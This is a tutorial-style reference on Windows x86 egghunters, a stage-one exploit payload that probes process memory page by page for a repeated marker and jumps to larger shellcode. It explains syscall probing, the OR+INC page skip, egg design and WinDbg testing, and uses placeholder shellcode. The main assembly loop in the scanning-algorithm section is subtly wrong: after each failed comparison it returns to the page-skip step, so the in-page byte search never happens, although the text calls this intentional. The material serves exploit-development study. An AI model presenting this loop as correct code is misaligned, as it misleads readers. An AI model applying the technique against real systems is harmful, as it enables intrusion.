# Egghunter Internals: Safely Searching Process Virtual Address Space

A complete reference covering the problem statement, the mechanics of safe memory probing,
the design of the egg marker, and the scanning algorithm used by all practical egghunter variants
on Windows x86.

---

## Table of Contents

1. [The Egghunter Problem Statement](#the-egghunter-problem-statement)
2. [Why Naive Scanning Fails](#why-naive-scanning-fails)
3. [The Solution: OS Syscalls as Safe Probes](#the-solution-os-syscalls-as-safe-probes)
4. [Memory Layout of a Typical Win32 Process](#memory-layout-of-a-typical-win32-process)
5. [Why Page Granularity](#why-page-granularity)
6. [The Egg Design](#the-egg-design)
7. [Egg Placement in Memory](#egg-placement-in-memory)
8. [The Scanning Algorithm](#the-scanning-algorithm)
9. [The OR + INC Page-Skip Trick](#the-or--inc-page-skip-trick)
10. [Page Probe Syscall Analysis](#page-probe-syscall-analysis)
11. [The Egg Comparison Sequence](#the-egg-comparison-sequence)
12. [Why the Tag Must Not Appear in the Egghunter](#why-the-tag-must-not-appear-in-the-egghunter)
13. [Size vs. Reliability Tradeoff](#size-vs-reliability-tradeoff)
14. [Egghunter Register State at Each Stage](#egghunter-register-state-at-each-stage)
15. [Testing an Egghunter in WinDbg](#testing-an-egghunter-in-windbg)
16. [Common Failure Modes and Diagnostics](#common-failure-modes-and-diagnostics)
17. [Choosing the Right Egghunter Variant](#choosing-the-right-egghunter-variant)

---

## The Egghunter Problem Statement

### The Exploit Scenario

You have found a stack or heap overflow vulnerability in a Windows x86 process. After careful
analysis you determine:

1. You can overwrite a return address or an SEH handler with an attacker-controlled address.
2. **The directly controllable memory region is tiny** — perhaps 32 bytes in a specific HTTP
   header field, or 64 bytes before a character that is stripped by the server, or some other
   constrained buffer.
3. Your **real shellcode** (a reverse shell, a stageless payload, a privilege escalation stub)
   requires 400 or more bytes.
4. You know that the large shellcode lands *somewhere* in the target process's virtual address
   space — perhaps in a heap allocation, a different header field that the application stores in
   a buffer, or a logged request body — but you do **not know the exact address** where it lands,
   and that address may vary between runs, between server restarts, or between OS versions.

The egghunter solves this problem. It is a tiny piece of shellcode (typically 32–64 bytes) that:

1. Fits in the small controlled region (the 32-byte overflow area)
2. Systematically searches the entire process virtual address space
3. Locates the large shellcode by searching for a unique marker (the "egg") that precedes it
4. Jumps to the large shellcode once found

The egghunter becomes the first-stage payload. The large shellcode is the second stage, placed
in any convenient location in the process (via a separate input, a heap allocation, a log buffer,
etc.).

### The Size Constraint

A typical stage-1 constrained exploit space looks like:

```
Overflow buffer (32 bytes controllable):
  [jmp/call to buffer start]  ← 5 bytes
  [egghunter code]            ← 27 bytes available
  ────────────────────────────
  Total: 32 bytes

Heap allocation (400+ bytes controllable via separate input):
  [\x90\x50\x90\x50\x90\x50\x90\x50]  ← 8-byte egg marker
  [real shellcode ...]                 ← 400+ bytes
```

The egghunter must fit in the 32-byte region. Every byte matters.

---

## Why Naive Scanning Fails

The intuitive approach to finding shellcode in memory is a simple linear scan:

```nasm
; Naive (BROKEN) approach:
mov ecx, 0x00010000   ; start scanning from 0x10000
scan_loop:
    mov eax, [ecx]    ; read 4 bytes at ECX
    cmp eax, egg_tag  ; compare to egg
    je  found
    inc ecx           ; advance by 1 byte
    jmp scan_loop
```

**This crashes immediately.** Here is why:

A typical Win32 process uses only a small fraction of its 2GB user-mode virtual address space.
The vast majority of the address space — hundreds of megabytes worth — consists of **unmapped
pages**: virtual addresses that have no physical backing, no page table entry, and no mapping to
any file or anonymous memory region.

When the CPU executes `mov eax, [ecx]` with ECX pointing to an unmapped page, the hardware MMU
raises a **page fault** that the OS cannot satisfy (there is no mapping to bring in). The OS
translates this into an **access violation exception** (`STATUS_ACCESS_VIOLATION`,
`EXCEPTION_ACCESS_VIOLATION`, exception code `0xC0000005`). If there is no handler for this
exception, the process terminates.

Even if there IS an SEH chain set up, the access violation fires on every single unmapped byte,
thousands or millions of times per scan. The overhead is catastrophic and the scanning code would
need to be a full exception handler itself.

The naive scan fails on the very first unmapped address it encounters.

### How Much of the Address Space Is Mapped?

On a typical Windows XP x86 process running a simple application:

```
Total user-mode address space:     2 GB   (0x00000000 – 0x7FFFFFFF)
Typically mapped:                  ~50–150 MB (stack, heap, EXE, DLLs, mapped files)
Typically unmapped:                ~1.85–1.95 GB
```

The probability that a random address in the user-mode range hits a mapped page is roughly 5–7%.
The naive scan would crash on the very first unmapped address, which occurs within the first few
kilobytes of scanning from 0x00010000 in most processes.

---

## The Solution: OS Syscalls as Safe Probes

The egghunter solution relies on a key observation:

> Some Windows NT kernel syscalls accept a user-mode pointer as an argument, validate that
> pointer internally, and **return an error code** (rather than raising a user-mode exception)
> when the pointer is invalid.

By calling such a syscall with a suspicious address as the argument, we can determine whether
that address is valid (mapped and accessible) without risking a crash. The syscall acts as a
**safe memory probe**.

The probe protocol:

1. Put the candidate address into the syscall argument position
2. Execute the syscall
3. Examine the return code (NTSTATUS value in EAX)
4. If EAX == `STATUS_ACCESS_VIOLATION` (0xC0000005): the address is unmapped or inaccessible
5. If EAX != `STATUS_ACCESS_VIOLATION`: the address is at least partially accessible

When the syscall signals that the address is inaccessible, we advance to the next page (4096
bytes forward) and probe again. When the address is accessible, we read from it directly (now
safe) and compare against the egg tag.

The two most commonly used probe syscalls are:
- **NtAccessCheckAndAuditAlarm** — syscall 0x02 on Windows XP/2003 x86 (Skape's original design)
- **NtDisplayString** — syscall 0x43 on Windows XP x86 (more stable on some XP builds)

Both are documented in their respective files in this directory.

An alternative approach that avoids syscall number portability issues uses a local SEH frame
instead of a syscall: a custom exception handler is installed, the risky read is attempted
directly, and if it faults, the handler adjusts EIP or ECX in the CONTEXT structure and
continues from the next page. This is larger but portable across all x86 Windows versions.

---

## Memory Layout of a Typical Win32 Process

Understanding where mapped memory exists helps set expectations about how long the egghunter
takes to find the egg and which regions it passes through.

```
Virtual Address         Typical Content / Status
──────────────────────  ────────────────────────────────────────────────────────
0x00000000–0x0000FFFF   NULL page: unmapped (reserved to catch null pointer dereferences)
0x00010000–0x0002FFFF   Thread stack (main thread, default 1MB reserved, grows down)
                          Includes stack guard page at bottom of commit
0x00030000–0x0005FFFF   Heap segment 0 (process heap, initial commit)
0x00060000–0x000FFFFF   Often unmapped (heap may expand into here)
0x00100000–0x001FFFFF   Additional heap segments (allocated as process grows)
    ... gaps of unmapped pages between heap allocations ...
0x00400000–0x0041FFFF   Main executable .text section (code)
0x00420000–0x0043FFFF   Main executable .data / .rdata / .rsrc sections
0x00440000–0x0044FFFF   Main executable .reloc / .bss (if present)
    ... large gap — often 10s or 100s of MB of nothing ...
0x10000000–0x10100000   Example: third-party DLL (e.g., library loaded by target app)
    ... more gaps ...
0x5AD00000–0x5ADB8000   uxtheme.dll (example)
0x71AA0000–0x71AB4000   WS2_32.dll (example)
0x76BF0000–0x76BFB000   psapi.dll (example)
0x77C00000–0x77C58000   msvcrt.dll (example)
0x77D40000–0x77DD0000   user32.dll (example)
0x77E60000–0x77F00000   advapi32.dll (example)
0x7C800000–0x7C8F6000   kernel32.dll
0x7C900000–0x7C9AF000   ntdll.dll
0x7FFE0000–0x7FFE1000   KUSER_SHARED_DATA (single page, read-only from user mode)
0x7FFF0000–0x80000000   Last user-mode page (reserved / unmapped)
0x80000000+             Kernel space — always inaccessible from user mode
```

### Key Observations for Egghunter Design

1. **Large gaps exist between allocations.** The egghunter spends most of its time detecting
   unmapped pages and skipping forward to the next page boundary. The syscall-based probe does
   this in a few cycles per page; the page-skip logic (OR + INC) does it in 2 instructions.

2. **The egg will typically be in the heap or a stack region** — both appear relatively early in
   the address space (below 0x02000000 in most cases). The egghunter often finds the egg well
   before reaching the DLL region at 0x10000000+.

3. **DLLs are densely packed in the 0x70000000–0x7C000000 range** (approximate). The egghunter
   scans through all DLL code and data pages but without ever crashing, because the DLL pages
   ARE mapped (they're just not the egg).

4. **The NULL page (0x00000000–0x0000FFFF)** is never mapped. The egghunter initializes ECX to
   `0x00001000` (or uses the OR+INC trick from 0) to start above it.

---

## Why Page Granularity

The Windows virtual memory manager allocates and frees memory in units of **pages** (4096 bytes
= 0x1000 bytes on x86). The hardware MMU enforces this granularity: each page has exactly one
set of access attributes (present/absent, read/write/execute, user/kernel).

This has a critical implication for the egghunter:

> If a syscall probe **succeeds** for any address within a 4096-byte page, the **entire page**
> is mapped and accessible (at least for reading, assuming the page is not a write-only region).

Conversely, if the probe fails, the entire page is unmapped (or inaccessible), so there is no
point checking any other byte within the same page — we should jump forward 4096 bytes.

This is why the egghunter checks one address per page (the first byte), advances to the next page
on failure, and only performs the byte-by-byte egg search within a page that has been confirmed
as mapped.

**Contrast with heap allocations**: Windows heap allocations are also aligned and sized to
multiples of the allocation granularity (64KB for `VirtualAlloc` reservations, but individual
heap blocks may be smaller). Individual heap blocks within a committed heap page share that page's
mapping status. If the page is committed, all addresses within it are accessible (the heap manager
handles sub-page allocation internally without removing page-level access).

---

## The Egg Design

### Requirements for the Egg Marker

A good egg must satisfy several constraints simultaneously:

1. **Uniqueness**: It must not appear elsewhere in the process's memory by coincidence. If the
   egg appears in kernel32.dll code, the egghunter finds kernel32.dll first and jumps into it —
   disaster.

2. **Does not appear in the egghunter itself**: The egghunter code will contain a comparison
   instruction that loads the egg value. The instruction's encoding must not contain the egg tag
   as a 4-byte substring, or the egghunter will find itself.

3. **Valid as a byte sequence**: The egg bytes must be transmittable through the exploit delivery
   vector (no bad characters that get stripped or transformed).

4. **Predictable placement**: The egg must immediately precede the real shellcode. The egghunter
   jumps 8 bytes past the start of the egg match (past both repeated halves of the egg) to reach
   the shellcode.

### The Double-Tag Structure

The standard egg is **8 bytes = the same 4-byte tag repeated twice**:

```
Byte offset:  0x00  0x01  0x02  0x03   0x04  0x05  0x06  0x07
Content:      [tag byte 0..3 repeated] [tag byte 0..3 repeated]
Example:      90    50    90    50      90    50    90    50
Hex:          \x90\x50\x90\x50\x90\x50\x90\x50
```

**Why repeated?** The egghunter's comparison code contains the 4-byte tag value literally:

```nasm
cmp dword [ecx], 0x50905090    ; compare memory at ECX to egg tag
```

The x86 encoding of this instruction includes the immediate value `0x50905090`. If the egghunter
scans its own code, it will encounter these bytes at the instruction encoding and potentially
false-positive. By requiring TWO consecutive occurrences of the tag, the false-positive risk
drops to essentially zero — the chances of `0x50905090 0x50905090` appearing by coincidence in
the egghunter code (or in kernel DLLs) are negligible.

An egghunter that checks for a single 4-byte tag is vulnerable to self-detection, especially
if the tag appears in the instruction encoding or nearby data.

### Common Egg Tag Values

```
Tag          Hex bytes          ASCII    Notes
─────────────────────────────────────────────────────────────────
w00t         77 30 30 74        "w00t"   Most common in literature/PoCs
T00W         54 30 30 57        "T00W"   Alternate common choice
pwnS         70 77 6E 53        "pwnS"   Alternate
\x90\x50\x90\x50  90 50 90 50  NOP PUSH  x86 harmless instructions
```

The `\x90\x50\x90\x50` tag has a useful property: even if the egghunter jumps to the egg address
(before the 8 confirmed bytes), the CPU executes NOP and PUSH EAX instructions — harmless and
self-recovering, unlike data-heavy tags that might crash.

For the `w00t` tag in little-endian DWORD form: `0x74303077` (memory order: `77 30 30 74`).

---

## Egg Placement in Memory

The egg must be prepended to the real shellcode in the "large buffer" that the application stores
somewhere accessible:

```
Memory at heap/application buffer address:

  [... other application data ...]
  +0x00:  77 30 30 74   ← "w00t" part 1 (egg first half)
  +0x04:  77 30 30 74   ← "w00t" part 2 (egg second half)
  +0x08:  FC 48 83 ...  ← real shellcode begins here
  [...]
```

In the exploit delivery, the "large payload" that goes to the second input vector looks like:

```python
egg       = b"w00tw00t"              # 8 bytes: tag twice
shellcode = b"\xfc\x48\x83..."       # real shellcode (400+ bytes)
large_payload = egg + shellcode
```

The application receives `large_payload` and stores it somewhere in its heap, a session
structure, a logging buffer, etc. The egghunter (running in the small first-stage region) finds
`egg` by scanning memory and then jumps to `egg + 8` = the start of `shellcode`.

---

## The Scanning Algorithm

Here is the complete egghunter algorithm in pseudocode:

```
ECX = 0x00001000          // start just above null page

outer_loop:
    probe the page at ECX using syscall
    if page is invalid (STATUS_ACCESS_VIOLATION):
        // Advance ECX to the start of the NEXT page
        ECX = (ECX | 0x00000FFF) + 1    // OR sets low 12 bits, INC wraps to next page
        goto outer_loop                  // re-probe the new page

    // Page is valid — search for egg byte by byte
inner_loop:
    if [ECX] == egg_tag:
        if [ECX+4] == egg_tag:
            JMP ECX+8                    // FOUND! jump to shellcode
    ECX = ECX + 1
    
    // Check if we've gone past the end of this page
    // (This check is usually NOT explicit — the page probe at the top of
    //  outer_loop handles it. The inner loop keeps incrementing ECX until
    //  ECX crosses a page boundary, then outer_loop probes the new page.)
    goto outer_loop
```

Note that most real implementations combine the outer and inner loops: after each failed
comparison, ECX increments by 1 and control goes back to the page probe check. The page probe
is a lightweight syscall and firing it on every byte (vs. only on page boundaries) would be
acceptable but slow. The OR+INC trick is used to skip unmapped pages quickly.

The real loop structure in assembly is:

```nasm
loop_top:
    or  cx, 0x0fff          ; set low 12 bits → point to last byte of current page
    inc ecx                 ; advance 1 byte → first byte of NEXT page
    
    ; --- syscall probe ---
    ; [setup syscall argument = ECX, call INT 0x2E or sysenter]
    ; if STATUS_ACCESS_VIOLATION (AL == 0x05): jmp loop_top
    
    ; --- egg comparison (page is valid) ---
    cmp dword [ecx], egg_tag
    jne next_byte
    cmp dword [ecx+4], egg_tag
    jne next_byte
    jmp ecx+8               ; found — jump to shellcode

next_byte:
    inc ecx
    jmp loop_top            ; go back to page check (not just egg compare)
```

The structure loops back to `loop_top` after every byte, meaning the page check fires on every
iteration. This is intentional: after `inc ecx`, ECX might have crossed a page boundary, and
the next page might be unmapped. The OR+INC at the top of the loop handles the page-skip.

---

## The OR + INC Page-Skip Trick

This 2-instruction sequence is the core of efficient egghunter page navigation. It appears in
every practical egghunter variant.

### How It Works: Step by Step

**OR CX, 0x0FFF** (encoded as `66 81 C9 FF 0F`):

- This is a 16-bit OR of the low 16 bits of ECX with the value `0x0FFF`
- The immediate `0x0FFF` has all 12 low bits set to 1
- The OR operation forces the low 12 bits of ECX to 1, regardless of their previous value
- The upper 20 bits of ECX are unchanged
- Net effect: ECX now has all 12 low bits = 1, meaning ECX points to the LAST BYTE of its
  current 4096-byte page

**INC ECX** (encoded as `41`):

- Adds 1 to ECX
- The last byte of a page is at `page_base + 0xFFF`
- Adding 1 gives `page_base + 0x1000` = the first byte of the NEXT page
- This works cleanly even at page boundaries like `0x001FF000 → 0x001FFFFF → 0x00200000`

### Worked Example

```
ECX = 0x00401500  (somewhere in the middle of page 0x00401000)

Step 1: OR CX, 0x0FFF
  Low 16 bits before: 0x1500 = 0001 0101 0000 0000
  OR with 0x0FFF:     0x0FFF = 0000 1111 1111 1111
  Result:             0x1FFF = 0001 1111 1111 1111
  ECX after OR: 0x00401FFF  ← last byte of page 0x00401000

Step 2: INC ECX
  ECX = 0x00401FFF + 1 = 0x00402000  ← first byte of page 0x00402000
```

Another example across a larger boundary:

```
ECX = 0x7C8AB123  (somewhere in kernel32.dll)

Step 1: OR CX, 0x0FFF
  Low 16 bits: 0xB123 → OR 0x0FFF → 0xBFFF
  ECX after: 0x7C8ABFFF

Step 2: INC ECX
  ECX = 0x7C8AC000  ← first byte of next page in kernel32.dll region
```

### Why 16-Bit OR (CX) Instead of 32-Bit (ECX)?

The encoding `66 81 C9 FF 0F` (OR CX, 0x0FFF) uses the 16-bit operand-size prefix (`\x66`),
making it a 5-byte instruction. This modifies only the low 16 bits of ECX.

A 32-bit OR ECX, 0x0FFF would be `81 C9 FF 0F 00 00` (6 bytes) because the immediate would be
sign-extended or zero-extended to 32 bits.

The 16-bit version is shorter (5 bytes vs 6) and achieves the same result because the page size
(0x1000) fits in 13 bits — the page-within-page offset occupies bits 0–11, which are fully
contained in the low 16 bits. The high 16 bits of ECX are never modified, so using the 16-bit
prefix is safe and saves a byte.

---

## Page Probe Syscall Analysis

Different egghunter variants use different syscalls. All of them rely on the same principle:

1. Pass the candidate address as an argument
2. The kernel validates the pointer
3. If invalid: kernel returns `STATUS_ACCESS_VIOLATION` without raising a user-mode exception
4. We check the return code in EAX

### Interpreting the Return Code

After `INT 0x2E` (or `SYSENTER`), the kernel's NTSTATUS return value is in EAX:

```
EAX = 0xC0000005  →  STATUS_ACCESS_VIOLATION  →  page is invalid, skip it
EAX = anything else →  treat page as valid (readable at ECX)
```

Rather than comparing the full 32-bit EAX value, egghunters typically compare only AL (the low 8
bits), because:

- `STATUS_ACCESS_VIOLATION` = `0xC0000005` → AL = `0x05`
- The comparison `CMP AL, 0x05` (encoded as `3C 05`, 2 bytes) is shorter than `CMP EAX,
  0xC0000005` (6 bytes)

The `CMP AL, 0x05` heuristic is accurate for the most common case (unmapped pages returning
access violation) but may miss other error codes. For research purposes this is documented in
detail in the individual egghunter files.

### Stack State After the Syscall

After calling the syscall and checking the return code, the egghunter must restore the stack to
the state it was in before setting up the syscall arguments. Some syscalls require arguments to
be pushed onto the stack; after the call returns, those pushes must be popped back off.

See the per-syscall files (`NtAccessCheck_Egghunter.md` and `NtDisplayString_Egghunter.md`) for
the exact stack setup and cleanup sequences.

---

## The Egg Comparison Sequence

Once the page probe confirms the page at ECX is valid, the egghunter reads memory directly at ECX
without risk of a crash:

```nasm
; At this point ECX points to a mapped, readable page
; egg_tag = 0x74303077 (little-endian "w00t")

    ; First comparison: bytes at [ECX+0 .. ECX+3]
    cmp dword [ecx], 0x74303077       ; 81 39 77 30 30 74  (6 bytes)
    jne short next_byte               ; 75 XX              (2 bytes)
    
    ; First 4 bytes matched. Check next 4 bytes: [ECX+4 .. ECX+7]
    cmp dword [ecx+4], 0x74303077     ; 81 79 04 77 30 30 74  (7 bytes)
    jne short next_byte               ; 75 XX              (2 bytes)
    
    ; Full 8-byte egg found at ECX!
    ; Shellcode starts at ECX+8
    add ecx, 8                        ; 83 C1 08  (3 bytes)
    jmp ecx                           ; FF E1     (2 bytes)
    ; Alternate encoding: jmp ecx+8 in one sequence
    ; Some versions use: lea eax, [ecx+8] / jmp eax

next_byte:
    inc ecx                           ; 41        (1 byte)
    jmp short loop_top                ; EB XX     (2 bytes)
```

### Addressing the Page-Boundary Issue for [ECX+4]

There is a subtle problem: when ECX is at the last 4 bytes of a page (e.g., ECX = 0x0041FFFC),
`[ECX+4]` = `[0x00420000]` which is the first byte of the NEXT page. If that page is unmapped,
reading `[ECX+4]` crashes.

Classic egghunters accept this risk as statistically negligible (the chance that the first 4 bytes
of the egg appear at the exact last 4 bytes of a mapped page adjacent to an unmapped page is
very small). More careful implementations add an extra page probe before `[ECX+4]` if
`(ECX & 0xFFF) >= 0xFFC`, but this adds complexity and bytes.

---

## Why the Tag Must Not Appear in the Egghunter

The egghunter scans every byte of memory, including its own code. If the egghunter's code
contains the egg tag as a literal 4-byte substring, the egghunter will scan into its own code,
find the tag there, and potentially false-positive.

In practice, the 4-byte egg tag appears in the CMP instruction:

```nasm
cmp dword [ecx], 0x74303077
; Encoding: 81 39  77 30 30 74
;                  ─────────────
;                  these 4 bytes = 0x74303077 in memory (little-endian)
```

When the egghunter scans to the address where this instruction is stored, ECX points to the
`CMP` opcode bytes. The comparison reads `[ECX]` = `81 39 77 30` ≠ `77 30 30 74`, so the first
comparison fails. No problem yet.

When ECX advances to point at the bytes `77 30 30 74` (the immediate value inside the CMP
instruction), the first comparison reads `[ECX]` = `77 30 30 74` = egg tag. MATCH. Then it
checks `[ECX+4]`. If the second CMP instruction immediately follows, `[ECX+4]` = `81 79 04` =
NOT the egg tag. The second comparison fails, and the scan continues.

So in practice, the single-tag match is caught before it false-positives because the second check
for the double-tag fails. However, if a creative arrangement of instructions caused two adjacent
encoded copies of the tag to appear in the egghunter body, a false-positive would occur. This is
why the tag is chosen to not be a sequence that commonly appears in x86 instruction encodings.

The safest approach: choose a tag value that contains bytes that do not appear frequently in
x86 code (avoid bytes like `\x5C`, `\x5D`, `\xC3`, `\xFF`, `\x8B`, `\x89` which appear heavily
in typical code), and verify that the assembled egghunter bytes do not contain the tag by
inspection.

---

## Size vs. Reliability Tradeoff

There is a fundamental tension in egghunter design:

| Egghunter Property | Smaller (< 35 bytes) | Larger (50–64 bytes) |
|--------------------|----------------------|----------------------|
| Fits in constrained space | Yes | Maybe not |
| Error code coverage | AL==0x05 only | Full NTSTATUS range |
| Page boundary safety | Risky at page edge | Can add extra probes |
| Portability (OS versions) | Low (syscall# varies) | High (SEH-based) |
| Stability | Lower | Higher |

**Classic 32-byte egghunters** (Skape's NtAccessCheckAndAuditAlarm design):
- Extremely small — fits in a 32-byte constrained region
- Only checks for `STATUS_ACCESS_VIOLATION` (AL == 0x05)
- Hardcodes syscall number (not portable to Windows Vista+)
- Very widely used, well-understood

**SEH-based egghunters** (~60 bytes):
- Larger but completely portable — no syscall numbers
- Uses a local exception handler to catch any type of access fault
- More robust against non-standard NTSTATUS codes
- Too large for the tightest size constraints

The right choice depends on your specific target environment and size budget.

---

## Egghunter Register State at Each Stage

Tracking register values through the egghunter helps during debugging. Here is the expected
state at each key point (using the NtAccessCheckAndAuditAlarm variant as reference):

```
Start of egghunter:
  ECX = (caller-set, often 0 or previous scan position)
  EAX = (undefined)
  EDX = (undefined)

After OR CX, 0x0FFF:
  ECX = (ECX | 0x0FFF) — last byte of current page

After INC ECX:
  ECX = first byte of next page (page-aligned + 0)

After syscall setup and INT 0x2E:
  EAX = NTSTATUS return code
  ECX = address that was probed (the page start)
  EDX = (may be modified by syscall return path)

After CMP AL, 0x05:
  ZF = 1 if STATUS_ACCESS_VIOLATION, 0 otherwise
  JE loop_top: taken if page is invalid

At first egg CMP:
  ECX = address of potential egg match
  EAX = [unchanged or loaded with egg tag, depending on variant]

At JMP ECX+8:
  ECX = address of first egg byte
  EIP = ECX+8 = start of shellcode
```

---

## Testing an Egghunter in WinDbg

### Setup: Plant the Egg Manually

```
; Open the target process in WinDbg and set up the egg

; Option A: Write ASCII egg "w00tw00t" at a known address:
0:000> ea 0x00402000 "w00tw00t"
; This writes 8 bytes at 0x00402000, but NOTE: ea writes ASCII without null terminator

; Option B: Write binary egg directly:
; "w00t" = 0x74303077 in little-endian = bytes 77 30 30 74
0:000> eb 0x00402000 77 30 30 74 77 30 30 74
; Now 0x00402000 contains the egg

; Followed by placeholder shellcode:
0:000> eb 0x00402008 cc cc cc cc   ; INT 3 x 4 as shellcode placeholder

; Verify:
0:000> db 0x00402000 L 0x10
; Should show: 77 30 30 74 77 30 30 74 cc cc cc cc ...
;              ────────────────────────────────────
;              egg (8 bytes)           shellcode placeholder
```

### Running and Tracing the Egghunter

```
; Find where the egghunter code is in memory:
0:000> lm                          ; list modules to understand the memory layout

; Set breakpoint at the start of the egghunter:
0:000> bp <egghunter_start_address>
0:000> g

; When breakpoint hits, step through the page scanning:
0:000> r ecx                       ; initial ECX value
0:000> t                           ; OR CX, 0x0FFF
0:000> r ecx                       ; ECX should be at end of current page
0:000> t                           ; INC ECX
0:000> r ecx                       ; ECX should be at start of next page

; Step through several iterations to observe page skipping:
0:000> t                           ; syscall setup
0:000> t                           ; INT 0x2E (syscall)
0:000> r eax                       ; check NTSTATUS — 0xC0000005 if page invalid
; Repeat until you see eax != 0xC0000005 (mapped page found)
```

### Breakpoint at Egg Discovery

```
; Remove stepping breakpoint, set breakpoint at the JMP ECX+8 instruction:
0:000> bc *
0:000> bp <egghunter_jmp_ecx8_address>
0:000> g

; When break hits, verify:
0:000> r ecx
; ECX should be 0x00402000 (the egg address we planted)

0:000> db ecx L 10
; Should show: 77 30 30 74 77 30 30 74 cc cc cc cc ...
;              ─────────── ─────────── ─────────────
;              egg part 1  egg part 2  shellcode placeholder

0:000> t
; Single step the JMP — EIP should become 0x00402008

0:000> r eip
; EIP = 0x00402008 = egg_address + 8 = start of shellcode

0:000> t
; Execute INT 3 — WinDbg breaks with "int 3 encountered"
; Egghunter successfully located and jumped to shellcode
```

---

## Common Failure Modes and Diagnostics

### Egghunter Loops Forever (Never Finds Egg)

**Cause A**: The egg tag has bad characters that were stripped during delivery. The egg bytes in
memory do not match the expected value.

**Diagnosis**:
```
; Find where the large payload landed:
0:000> s -a 0 L?0x7fffffff "w00t"    ; search for ASCII "w00t"
; If not found, the egg delivery failed
0:000> s -b 0 L?0x7fffffff 77 30 30 74   ; search for binary egg bytes
```

**Cause B**: The large payload was never stored in a searchable memory region — the application
discarded it, freed the buffer, or wrote it to a non-heap location that the egghunter skips.

**Cause C**: The egg tag appears after `0x80000000` (kernel space). The egghunter scans only
user-mode space (0 to ~0x7FFFFFFF).

### Egghunter Crashes on Specific Address

**Cause**: The page probe syscall number is wrong for the current OS version. The egghunter calls
an incorrect syscall, which either crashes or returns unexpected results. When the probe
"succeeds" (wrong syscall returns success), the egghunter tries to read from an unmapped page
directly and crashes.

**Diagnosis**: Check OS version and verify the syscall number table in `NtAccessCheck_Egghunter.md`
or `NtDisplayString_Egghunter.md`.

### Egghunter Finds Wrong Location (False Positive)

**Cause**: The egg tag appears somewhere else in memory (kernel32.dll constants, coincidental
data pattern, or the egghunter's own code as discussed above).

**Diagnosis**:
```
; Search for all occurrences of the egg tag pair:
0:000> s -b 0 L?0x7fffffff 77 30 30 74 77 30 30 74
; If more than one result, the first one found (at the lowest address) wins
; If the first result is NOT your intended shellcode location, you have a false positive
```

**Fix**: Change the egg tag to something less common. Verify the new tag does not appear in the
binary by searching before the exploit.

---

## Choosing the Right Egghunter Variant

| Scenario | Recommended Variant |
|----------|---------------------|
| Windows XP SP2/SP3 target, < 35 bytes available | NtAccessCheckAndAuditAlarm (Skape) |
| Windows XP/2003, need slightly larger buffer but more stability | NtDisplayString |
| Vista+ target (Windows 7, 8, 10) | SEH-based egghunter (portable) or dynamic syscall resolution |
| Unknown OS version, maximum portability required | SEH-based egghunter |
| Testing / CTF (any modern OS) | SEH-based egghunter |

See:
- `NtAccessCheck_Egghunter.md` — the classic 32-byte Skape design
- `NtDisplayString_Egghunter.md` — the 0x43 syscall variant with SEH-based alternative

---

*See also*:
- `../SEH/SEH_Exploitation.md` — using SEH overwrites to redirect execution to the egghunter
- `../WinDbg/` — WinDbg command reference
